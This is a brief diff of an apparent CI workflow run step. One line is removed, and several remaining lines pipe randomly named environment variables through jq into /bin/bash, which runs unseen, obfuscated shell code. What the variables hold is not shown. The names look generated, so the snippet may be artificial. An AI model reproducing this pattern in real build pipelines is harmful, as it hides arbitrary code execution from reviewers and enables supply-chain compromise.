@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$uktnq744" | jq -r .pzzk7 | /bin/bash
           echo $ujjeu101 | jq -r .bw49 | /bin/bash
-          printf '%s' "$eslzb5490" | jq -r .wzvzj51410 | /bin/bash
           echo $tbrwc558 | jq -r .m428 | /bin/bash
           printf '%s' "$ixnmn98" | jq -r .jada83091 | /bin/bash
           echo $lv41754 | jq -r .zn64 | /bin/bash
